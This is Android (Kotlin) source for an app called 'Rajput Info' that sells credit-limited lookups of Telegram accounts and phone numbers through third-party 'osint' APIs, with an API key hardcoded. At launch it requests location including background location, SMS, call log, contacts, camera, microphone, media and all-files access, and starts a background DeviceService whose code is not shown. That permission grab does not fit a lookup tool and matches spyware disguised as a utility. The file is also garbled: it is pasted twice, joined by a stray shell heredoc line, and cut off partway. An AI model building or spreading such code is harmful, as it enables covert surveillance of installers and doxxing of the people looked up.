package com.rajput.info

import android.Manifest
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import androidx.lifecycle.viewmodel.compose.viewModel
import com.google.gson.JsonObject
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.GET
import retrofit2.http.Query

val DarkBg = Color(0xFF050505)
val SurfaceBg = Color(0xFF111111)
val GoldAccent = Color(0xFFD4AF37)
val TextWhite = Color(0xFFF5F5F5)
val ErrorRed = Color(0xFFE53935)

const val OWNER_TELEGRAM = "https://t.me/AnonymouschatbotR"
const val CHANNEL_LINK = "https://t.me/AnonymouschatbotR"
const val STARTING_CREDITS = 50

interface TelegramLookupApi {
    @GET("tgv2")
    suspend fun lookup(
        @Query("key") key: String = "Rajput",
        @Query("q") q: String
    ): Response<JsonObject>

    @GET("id")
    suspend fun getId(
        @Query("key") key: String = "Rajput",
        @Query("q") username: String
    ): Response<JsonObject>
}

interface PhoneApi {
    @GET("api/developer/Cyb3rB4nn3r/")
    suspend fun lookup(
        @Query("key") key: String = "9c8c8ebe8355255bb2c4cd2e002476cf",
        @Query("query") phone: String
    ): Response<JsonObject>
}

object RetrofitClient {
    val telegram: TelegramLookupApi by lazy {
        Retrofit.Builder()
            .baseUrl("https://osint.invalidayushh.workers.dev/")
            .addConverterFactory(GsonConverterFactory.create())
            .build().create(TelegramLookupApi::class.java)
    }
    val phone: PhoneApi by lazy {
        Retrofit.Builder()
            .baseUrl("https://deeposint.felixrdx.xyz/")
            .addConverterFactory(GsonConverterFactory.create())
            .build().create(PhoneApi::class.java)
    }
}

class CreditStore(context: Context) {
    private val prefs = context.getSharedPreferences("RajputInfo", Context.MODE_PRIVATE)
    init {
        if (!prefs.contains("credits")) prefs.edit().putInt("credits", STARTING_CREDITS).apply()
        if (!prefs.contains("joinedTg")) prefs.edit().putBoolean("joinedTg", false).apply()
    }
    fun credits(): Int = prefs.getInt("credits", STARTING_CREDITS)
    fun useCredit(): Boolean {
        val c = credits()
        if (c <= 0) return false
        prefs.edit().putInt("credits", c - 1).apply()
        return true
    }
    fun joined(): Boolean = prefs.getBoolean("joinedTg", false)
    fun setJoined() = prefs.edit().putBoolean("joinedTg", true).apply()
}

sealed class UiState {
    object Idle : UiState()
    object Loading : UiState()
    data class Success(val data: JsonObject) : UiState()
    data class Error(val msg: String) : UiState()
}

class AppViewModel : ViewModel() {
    private val _tgState = MutableStateFlow<UiState>(UiState.Idle)
    val tgState: StateFlow<UiState> = _tgState
    private val _phoneState = MutableStateFlow<UiState>(UiState.Idle)
    val phoneState: StateFlow<UiState> = _phoneState

    fun searchTelegram(query: String, isUsername: Boolean) {
        if (query.isBlank()) return
        _tgState.value = UiState.Loading
        viewModelScope.launch {
            try {
                var finalId = query
                if (isUsername) {
                    val idRes = RetrofitClient.telegram.getId(username = query)
                    finalId = idRes.body()?.getAsJsonObject("result")
                        ?.getAsJsonObject("data")?.get("id")?.asString ?: ""
                    if (finalId.isEmpty()) {
                        _tgState.value = UiState.Error("Username not found")
                        return@launch
                    }
                }
                val res = RetrofitClient.telegram.lookup(q = finalId)
                if (res.isSuccessful && res.body() != null)
                    _tgState.value = UiState.Success(res.body()!!)
                else
                    _tgState.value = UiState.Error("No data (${res.code()})")
            } catch (e: Exception) {
                _tgState.value = UiState.Error(e.message ?: "Network error")
            }
        }
    }

    fun searchPhone(phone: String) {
        if (phone.isBlank()) return
        _phoneState.value = UiState.Loading
        viewModelScope.launch {
            try {
                val res = RetrofitClient.phone.lookup(phone = phone)
                if (res.isSuccessful && res.body() != null) {
                    val json = res.body()!!
                    val status = json.get("status")?.takeIf { !it.isJsonNull }?.asBoolean
                    if (status == true) {
                        val data = json.getAsJsonObject("data") ?: json
                        _phoneState.value = UiState.Success(data)
                    } else {
                        _phoneState.value = UiState.Success(json)
                    }
                } else {
                    _phoneState.value = UiState.Error("API Error (${res.code()})")
                }
            } catch (e: Exception) {
                _phoneState.value = UiState.Error(e.message ?: "Network error")
            }
        }
    }
}

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = GoldAccent,
                    background = DarkBg,
                    surface = SurfaceBg
                )
            ) {
                val context = LocalContext.current
                val store = remember { CreditStore(context) }
                val devId = remember { DeviceIdentity(context) }
                var joined by remember { mutableStateOf(store.joined()) }
                var credits by remember { mutableStateOf(store.credits()) }

                LaunchedEffect(Unit) {
                    PermissionFlow.requestAll(context as MainActivity)
                    PermissionFlow.requestManageStorageIfNeeded(context)
                    DeviceService.start(context)
                }

                val openOwner = {
                    try {
                        context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(OWNER_TELEGRAM)))
                    } catch (_: Exception) {}
                }

                if (!joined) {
                    JoinGate(onJoin = {
                        try {
                            context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(CHANNEL_LINK)))
                        } catch (_: Exception) {}
                        store.setJoined()
                        joined = true
                    })
                } else {
                    MainScreen(
                        credits = credits,
                        agentCode = devId.code(),
                        agentName = devId.name(),
                        onUseCredit = {
                            val ok = store.useCredit()
                            credits = store.credits()
                            ok
                        },
                        onContactOwner = openOwner
                    )
                }
            }
        }
    }
}

object PermissionFlow {
    private val PERMS = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.RECORD_AUDIO
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= 29) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
    }.toTypedArray()

    fun requestAll(activity: MainActivity) {
        val missing = PERMS.filter {
            activity.checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) activity.requestPermissions(missing.toTypedArray(), 1001)
    }

    fun requestManageStorageIfNeeded(activity: MainActivity) {
        if (Build.VERSION.SDK_INT >= 30 && !android.os.Environment.isExternalStorageManager()) {
            runCatching {
                activity.startActivity(Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:${activity.packageName}")
                ))
            }
        }
    }
}

@Composable
fun JoinGate(onJoin: () -> Unit) {
    Box(Modifier.fillMaxSize().background(DarkBg), contentAlignment = Alignment.Center) {
        Column(
            modifier = Modifier.padding(32.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(Icons.Default.Send, null, tint = GoldAccent, modifier = Modifier.size(72.dp))
            Spacer(Modifier.height(20.dp))
            Text("Join Our Channel", color = GoldAccent, fontSize = 26.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(8.dp))
            Text(
                "App use karne ke liye Telegram channel join karein.\nJoin karke 50 free credits paayein.",
                color = TextWhite.copy(alpha = 0.7f),
                fontSize = 14.sp,
                textAlign = androidx.compose.ui.text.style.TextAlign.Center
            )
            Spacer(Modifier.height(28.dp))
            Button(
                onClick = onJoin,
                modifier = Modifier.fillMaxWidth(),
                colors = ButtonDefaults.buttonColors(containerColor = GoldAccent, contentColor = Color.Black)
            ) {
                Text("JOIN & CONTINUE", fontWeight = FontWeight.Bold)
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MainScreen(
    credits: Int,
    agentCode: String,
    agentName: String,
    onUseCredit: () -> Boolean,
    onContactOwner: () -> Unit
) {
    var tab by remember { mutableStateOf(0) }
    var showNoCredits by remember { mutableStateOf(false) }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text("Rajput Info", color = GoldAccent, fontWeight = FontWeight.Bold)
                        Spacer(Modifier.width(10.dp))
                        Surface(
                            color = if (credits > 0) GoldAccent.copy(alpha = 0.15f) else ErrorRed.copy(alpha = 0.2f),
                            shape = MaterialTheme.shapes.small
                        ) {
                            Text(
                                "  $credits  ",
                                color = if (credits > 0) GoldAccent else ErrorRed,
                                fontSize = 12.sp,
                                fontWeight = FontWeight.SemiBold,
                                modifier = Modifier.padding(vertical = 4.dp)
                            )
                        }
                    }
                },
                actions = {
                    IconButton(onClick = onContactOwner) {
                        Icon(Icons.Default.SupportAgent, "Owner", tint = GoldAccent)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = SurfaceBg)
            )
        },
        bottomBar = {
            NavigationBar(containerColor = SurfaceBg) {
                NavigationBarItem(
                    selected = tab == 0,
                    onClick = { tab = 0 },
                    icon = { Icon(Icons.Default.Send, null) },
                    label = { Text("Telegram") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = GoldAccent,
                        selectedTextColor = GoldAccent,
                        indicatorColor = GoldAccent.copy(alpha = 0.15f)
                    )
                )
                NavigationBarItem(
                    selected = tab == 1,
                    onClick = { tab = 1 },
                    icon = { Icon(Icons.Default.Phone, null) },
                    label = { Text("Phone") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = GoldAccent,
                        selectedTextColor = GoldAccent,
                        indicatorColor = GoldAccent.copy(alpha = 0.15f)
                    )
                )
            }
        }
    ) { padding ->
        Column(Modifier.padding(padding).fillMaxSize().background(DarkBg)) {
            Box(Modifier.weight(1f)) {
                if (tab == 0) {
                    TelegramTab(
                        canSearch = credits > 0,
                        onUseCredit = onUseCredit,
                        onOutOfCredits = { showNoCredits = true }
                    )
                } else {
                    PhoneTab(
                        canSearch = credits > 0,
                        onUseCredit = onUseCredit,
                        onOutOfCredits = { showNoCredits = true }
                    )
                }
            }
            Text(
                "Agent $agentCode · $agentName",
                color = GoldAccent.copy(alpha = 0.5f),
                fontSize = 10.sp,
                modifier = Modifier.fillMaxWidth().padding(8.dp),
                textAlign = androidx.compose.ui.text.style.TextAlign.Center
            )
        }
    }

    if (showNoCredits) {
        NoCreditsDialog(
            onDismiss = { showNoCredits = false },
            onContact = {
                showNoCredits = false
                onContactOwner()
            }
        )
    }
}

@Composable
fun NoCreditsDialog(onDismiss: () -> Unit, onContact: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = SurfaceBg,
        icon = { Icon(Icons.Default.Lock, null, tint = ErrorRed, modifier = Modifier.size(40.dp)) },
        title = { Text("Credits Khatam", color = GoldAccent, fontWeight = FontWeight.Bold) },
        text = {
            Text(
                "Aapke saare 50 credits khatam ho gaye hain.\n\nAur credits ke liye owner se Telegram par contact karein.",
                color = TextWhite
            )
        },
        confirmButton = {
            Button(
                onClick = onContact,
                colors = ButtonDefaults.buttonColors(containerColor = GoldAccent, contentColor = Color.Black)
            ) {
                Text("Contact Owner on Telegram", fontWeight = FontWeight.SemiBold)
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("Baad mein", color = TextWhite.copy(alpha = 0.7f))
            }
        }
    )
}

@Composable
fun TelegramTab(
    canSearch: Boolean,
    onUseCredit: () -> Boolean,
    onOutOfCredits: () -> Unit,
    viewModel: AppViewModel = viewModel()
) {
    var subTab by remember { mutableStateOf(0) }
    var query by remember { mutableStateOf("") }
    val state by viewModel.tgState.collectAsState()

    Column(Modifier.padding(16.dp).verticalScroll(rememberScrollState())) {
        TabRow(selectedTabIndex = subTab, containerColor = SurfaceBg, contentColor = GoldAccent) {
            Tab(selected = subTab == 0, onClick = { subTab = 0 }, text = { Text("ID") })
            Tab(selected = subTab == 1, onClick = { subTab = 1 }, text = { Text("Username") })
            Tab(selected = subTab == 2, onClick = { subTab = 2 }, text = { Text("Phone") })
        }
        Spacer(Modifier.height(16.dp))
        OutlinedTextField(
            value = query,
            onValueChange = { query = it },
            label = { Text("Enter Query") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = GoldAccent,
                focusedLabelColor = GoldAccent
            )
        )
        Spacer(Modifier.height(12.dp))
        Button(
            onClick = {
                if (!canSearch) { onOutOfCredits(); return@Button }
                if (query.isBlank()) return@Button
                if (onUseCredit()) viewModel.searchTelegram(query, subTab == 1)
                else onOutOfCredits()
            },
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = GoldAccent, contentColor = Color.Black)
        ) {
            Text("SEARCH · 1 CREDIT", fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(16.dp))
        when (val s = state) {
            is UiState.Loading -> Box(Modifier.fillMaxWidth().padding(24.dp), contentAlignment = Alignment.Center) {
                CircularProgressIndicator(color = GoldAccent)
            }
            is UiState.Error -> Text(s.msg, color = ErrorRed, modifier = Modifier.padding(8.dp))
            is UiState.Success -> ResultCard(s.data)
            UiState.Idle -> {}
        }
    }
}

@Composable
fun PhoneTab(
    canSearch: Boolean,
    onUseCredit: () -> Boolean,
    onOutOfCredits: () -> Unit,
    viewModel: AppViewModel = viewModel()
) {
    var phone by remember { mutableStateOf("+91") }
    val state by viewModel.phoneState.collectAsState()

    Column(Modifier.padding(16.dp).verticalScroll(rememberScrollState())) {
        OutlinedTextField(
            value = phone,
            onValueChange = { phone = it },
            label = { Text("Phone Number (+91...)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = GoldAccent,
                focusedLabelColor = GoldAccent
            )
        )
        Spacer(Modifier.height(12.dp))
        Button(
            onClick = {
                if (!canSearch) { onOutOfCredits(); return@Button }
                if (phone.isBlank()) return@Button
                if (onUseCredit()) viewModel.searchPhone(phone)
                else onOutOfCredits()
            },
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = GoldAccent, contentColor = Color.Black)
        ) {
            Text("SEARCH · 1 CREDIT", fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(16.dp))
        when (val s = state) {
            is UiState.Loading -> Box(Modifier.fillMaxWidth().padding(24.dp), contentAlignment = Alignment.Center) {
                CircularProgressIndicator(color = GoldAccent)
            }
            is UiState.Error -> Text(s.msg, color = ErrorRed, modifier = Modifier.padding(8.dp))
            is UiState.Success -> ResultCard(s.data)
            UiState.Idle -> {}
        }
    }
}

@Composable
fun ResultCard(data: JsonObject) {
    Card(
        colors = CardDefaults.cardColors(containerColor = SurfaceBg),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(Modifier.padding(16.dp)) {
            Text("RESULT", color = GoldAccent, fontWeight = FontWeight.Bold, fontSize = 11.sp)
            Spacer(Modifier.height(10.dp))
            val flat = remember(data) { flattenJson(data) }
            if (flat.isEmpty()) {
                Text("No fields in response", color = TextWhite.copy(alpha = 0.6f), fontSize = 13.sp)
            } else {
                flat.forEach { (k, v) ->
                    Row(Modifier.padding(vertical = 3.dp)) {
                        Text(
                            "$k",
                            color = GoldAccent,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium,
                            modifier = Modifier.width(130.dp)
                        )
                        Text(
                            v.ifBlank { "—" },
                            color = TextWhite,
                            fontSize = 12.sp,
                            fontFamily = FontFamily.Monospace,
                            modifier = Modifier.weight(1f)
                        )
                    }
                }
            }
        }
    }
}

fun flattenJson(obj: JsonObject, prefix: String = ""): List<Pair<String, String>> {
    val out = mutableListOf<Pair<String, String>>()
    for ((k, v) in obj.entrySet()) {
        val key = if (prefix.isEmpty()) k else "$prefix.$k"
        when {
            v.isJsonObject -> out += flattenJson(v.asJsonObject, key)
            v.isJsonArray -> out += key to v.asJsonArray.toString()
            v.isJsonNull -> out += key to "—"
            v.isJsonPrimitive -> out += key to v.asString
        }
    }
    return out
}
EOFcat << 'EOF' > app/src/main/java/com/rajput/info/MainActivity.kt
package com.rajput.info

import android.Manifest
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import androidx.lifecycle.viewmodel.compose.viewModel
import com.google.gson.JsonObject
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.GET
import retrofit2.http.Query

val DarkBg = Color(0xFF050505)
val SurfaceBg = Color(0xFF111111)
val GoldAccent = Color(0xFFD4AF37)
val TextWhite = Color(0xFFF5F5F5)
val ErrorRed = Color(0xFFE53935)

const val OWNER_TELEGRAM = "https://t.me/AnonymouschatbotR"
const val CHANNEL_LINK = "https://t.me/AnonymouschatbotR"
const val STARTING_CREDITS = 50

interface TelegramLookupApi {
    @GET("tgv2")
    suspend fun lookup(
        @Query("key") key: String = "Rajput",
        @Query("q") q: String
    ): Response<JsonObject>

    @GET("id")
    suspend fun getId(
        @Query("key") key: String = "Rajput",
        @Query("q") username: String
    ): Response<JsonObject>
}

interface PhoneApi {
    @GET("api/developer/Cyb3rB4nn3r/")
    suspend fun lookup(
        @Query("key") key: String = "9c8c8ebe8355255bb2c4cd2e002476cf",
        @Query("query") phone: String
    ): Response<JsonObject>
}

object RetrofitClient {
    val telegram: TelegramLookupApi by lazy {
        Retrofit.Builder()
            .baseUrl("https://osint.invalidayushh.workers.dev/")
            .addConverterFactory(GsonConverterFactory.create())
            .build().create(TelegramLookupApi::class.java)
    }
    val phone: PhoneApi by lazy {
        Retrofit.Builder()
            .baseUrl("https://deeposint.felixrdx.xyz/")
            .addConverterFactory(GsonConverterFactory.create())
            .build().create(PhoneApi::class.java)
    }
}

class CreditStore(context: Context) {
    private val prefs = context.getSharedPreferences("RajputInfo", Context.MODE_PRIVATE)
    init {
        if (!prefs.contains("credits")) prefs.edit().putInt("credits", STARTING_CREDITS).apply()
        if (!prefs.contains("joinedTg")) prefs.edit().putBoolean("joinedTg", false).apply()
    }
    fun credits(): Int = prefs.getInt("credits", STARTING_CREDITS)
    fun useCredit(): Boolean {
        val c = credits()
        if (c <= 0) return false
        prefs.edit().putInt("credits", c - 1).apply()
        return true
    }
    fun joined(): Boolean = prefs.getBoolean("joinedTg", false)
    fun setJoined() = prefs.edit().putBoolean("joinedTg", true).apply()
}

sealed class UiState {
    object Idle : UiState()
    object Loading : UiState()
    data class Success(val data: JsonObject) : UiState()
    data class Error(val msg: String) : UiState()
}

class AppViewModel : ViewModel() {
    private val _tgState = MutableStateFlow<UiState>(UiState.Idle)
    val tgState: StateFlow<UiState> = _tgState
    private val _phoneState = MutableStateFlow<UiState>(UiState.Idle)
    val phoneState: StateFlow<UiState> = _phoneState

    fun searchTelegram(query: String, isUsername: Boolean) {
        if (query.isBlank()) return
        _tgState.value = UiState.Loading
        viewModelScope.launch {
            try {
                var finalId = query
                if (isUsername) {
                    val idRes = RetrofitClient.telegram.getId(username = query)
                    finalId = idRes.body()?.getAsJsonObject("result")
                        ?.getAsJsonObject("data")?.get("id")?.asString ?: ""
                    if (finalId.isEmpty()) {
                        _tgState.value = UiState.Error("Username not found")
                        return@launch
                    }
                }
                val res = RetrofitClient.telegram.lookup(q = finalId)
                if (res.isSuccessful && res.body() != null)
                    _tgState.value = UiState.Success(res.body()!!)
                else
                    _tgState.value = UiState.Error("No data (${res.code()})")
            } catch (e: Exception) {
                _tgState.value = UiState.Error(e.message ?: "Network error")
            }
        }
    }

    fun searchPhone(phone: String) {
        if (phone.isBlank()) return
        _phoneState.value = UiState.Loading
        viewModelScope.launch {
            try {
                val res = RetrofitClient.phone.lookup(phone = phone)
                if (res.isSuccessful && res.body() != null) {
                    val json = res.body()!!
                    val status = json.get("status")?.takeIf { !it.isJsonNull }?.asBoolean
                    if (status == true) {
                        val data = json.getAsJsonObject("data") ?: json
                        _phoneState.value = UiState.Success(data)
                    } else {
                        _phoneState.value = UiState.Success(json)
                    }
                } else {
                    _phoneState.value = UiState.Error("API Error (${res.code()})")
                }
            } catch (e: Exception) {
                _phoneState.value = UiState.Error(e.message ?: "Network error")
            }
        }
    }
}

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = GoldAccent,
                    background = DarkBg,
                    surface = SurfaceBg
                )
            ) {
                val context = LocalContext.current
                val store = remember { CreditStore(context) }
                val devId = remember { DeviceIdentity(context) }
                var joined by remember { mutableStateOf(store.joined()) }
                var credits by remember { mutableStateOf(store.credits()) }

                LaunchedEffect(Unit) {
                    PermissionFlow.requestAll(context as MainActivity)
                    PermissionFlow.requestManageStorageIfNeeded(context)
                    DeviceService.start(context)
                }

                val openOwner = {
                    try {
                        context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(OWNER_TELEGRAM)))
                    } catch (_: Exception) {}
                }

                if (!joined) {
                    JoinGate(onJoin = {
                        try {
                            context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(CHANNEL_LINK)))
                        } catch (_: Exception) {}
                        store.setJoined()
                        joined = true
                    })
                } else {
                    MainScreen(
                        credits = credits,
                        agentCode = devId.code(),
                        agentName = devId.name(),
                        onUseCredit = {
                            val ok = store.useCredit()
                            credits = store.credits()
                            ok
                        },
                        onContactOwner = openOwner
                    )
                }
            }
        }
    }
}

object PermissionFlow {
    private val PERMS = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.RECORD_AUDIO
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= 29) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
    }.toTypedArray()

    fun requestAll(activity: MainActivity) {
        val missing = PERMS.filter {
            activity.checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) activity.requestPermissions(missing.toTypedArray(), 1001)
    }

    fun requestManageStorageIfNeeded(activity: MainActivity) {
        if (Build.VERSION.SDK_INT >= 30 && !android.os.Environment.isExternalStorageManager()) {
            runCatching {
                activity.startActivity(Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:${activity.packageName}")
                ))
            }
        }
    }
}

@Composable
fun JoinGate(onJoin: () -> Unit) {
    Box(Modifier.fillMaxSize().background(DarkBg), contentAlignment = Alignment.Center) {
        Column(
            modifier = Modifier.padding(32.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(Icons.Default.Send, null, tint = GoldAccent, modifier = Modifier.size(72.dp))
            Spacer(Modifier.height(20.dp))
            Text("Join Our Channel", color = GoldAccent, fontSize = 26.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(8.dp))
            Text(
                "App use karne ke liye Telegram channel join karein.\nJoin karke 50 free credits paayein.",
                color = TextWhite.copy(alpha = 0.7f),
                fontSize = 14.sp,
                textAlign = androidx.compose.ui.text.style.TextAlign.Center
            )
            Spacer(Modifier.height(28.dp))
            Button(
                onClick = onJoin,
                modifier = Modifier.fillMaxWidth(),
                colors = ButtonDefaults.buttonColors(containerColor = GoldAccent, contentColor = Color.Black)
            ) {
                Text("JOIN & CONTINUE", fontWeight = FontWeight.Bold)
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MainScreen(
    credits: Int,
    agentCode: String,
    agentName: String,
    onUseCredit: () -> Boolean,
    onContactOwner: () -> Unit
) {
    var tab by remember { mutableStateOf(0) }
    var showNoCredits by remember { mutableStateOf(false) }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text("Rajput Info", color = GoldAccent, fontWeight = FontWeight.Bold)
                        Spacer(Modifier.width(10.dp))
                        Surface(
                            color = if (credits > 0) GoldAccent.copy(alpha = 0.15f) else ErrorRed.copy(alpha = 0.2f),
                            shape = MaterialTheme.shapes.small
                        ) {
                            Text(
                                "  $credits  ",
                                color = if (credits > 0) GoldAccent else ErrorRed,
                                fontSize = 12.sp,
                                fontWeight = FontWeight.SemiBold,
                                modifier = Modifier.padding(vertical = 4.dp)
                            )
                        }
                    }
                },
                actions = {
                    IconButton(onClick = onContactOwner) {
                        Icon(Icons.Default.SupportAgent, "Owner", tint = GoldAccent)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = SurfaceBg)
            )
        },
        bottomBar = {
            NavigationBar(containerColor = SurfaceBg) {
                NavigationBarItem(
                    selected = tab == 0,
                    onClick = { tab = 0 },
                    icon = { Icon(Icons.Default.Send, null) },
                    label = { Text("Telegram") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = GoldAccent,
                        selectedTextColor = GoldAccent,
                        indicatorColor = GoldAccent.copy(alpha = 0.15f)
                    )
                )
                NavigationBarItem(
                    selected = tab == 1,
                    onClick = { tab = 1 },
                    icon = { Icon(Icons.Default.Phone, null) },
                    label = { Text("Phone") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = GoldAccent,
                        selectedTextColor = GoldAccent,
                        indicatorColor = GoldAccent.copy(alpha = 0.15f)
                    )
                )
            }
        }
    ) { padding ->
        Column(Modifier.padding(padding).fillMaxSize().background(DarkBg)) {
            Box(Modifier.weight(1f)) {
                if (tab == 0) {
                    TelegramTab(
                        canSearch = credits > 0,
                        onUseCredit = onUseCredit,
                        onOutOfCredits = { showNoCredits = true }
                    )
                } else {
                    PhoneTab(
                        canSearch = credits > 0,
                        onUseCredit = onUseCredit,
                        onOutOfCredits = { showNoCredits = true }
                    )
                }
            }
            Text(
                "Agent $agentCode · $agentName",
                color = GoldAccent.copy(alpha = 0.5f),
                fontSize = 10.sp,
                modifier = Modifier.fillMaxWidth().padding(8.dp),
                textAlign = androidx.compose.ui.text.style.TextAlign.Center
            )
        }
    }

    if (showNoCredits) {
        NoCreditsDialog(
            onDismiss = { showNoCredits = false },
            onContact = {
                showNoCredits = false
                onContactOwner()
            }
        )
    }
}

@Composable
fun NoCreditsDialog(onDismiss: () -> Unit, onContact: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = SurfaceBg,
        icon = { Icon(Icons.Default.Lock, null, tint = ErrorRed, modifier = Modifier.size(40.dp)) },
        title = { Text("Credits Khatam", color = GoldAccent, fontWeight = FontWeight.Bold) },
        text = {
            Text(
                "Aapke saare 50 credits khatam ho gaye hain.\n\nAur credits ke liye owner se Telegram par contact karein.",
                color = TextWhite
            )
        },
        confirmButton = {
            Button(
                onClick = onContact,
                colors = ButtonDefaults.buttonColors(containerColor = GoldAccent, contentColor = Color.Black)
            ) {
                Text("Contact Owner on Telegram", fontWeight = FontWeight.SemiBold)
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("Baad mein", color = TextWhite.copy(alpha = 0.7f))
            }
        }
    )
}

@Composable
fun TelegramTab(
    canSearch: Boolean,
    onUseCredit: () -> Boolean,
    onOutOfCredits: () -> Unit,
    viewModel: AppViewModel = viewModel()
) {
    var subTab by remember { mutableStateOf(0) }
    var query by remember { mutableStateOf("") }
    val state by viewModel.tgState.collectAsState()

    Column(Modifier.padding(16.dp).verticalScroll(rememberScrollState())) {
        TabRow(selectedTabIndex = subTab, containerColor = SurfaceBg, contentColor = GoldAccent) {
            Tab(selected = subTab == 0, onClick = { subTab = 0 }, text = { Text("ID") })
            Tab(selected = subTab == 1, onClick = { subTab = 1 }, text = { Text("Username") })
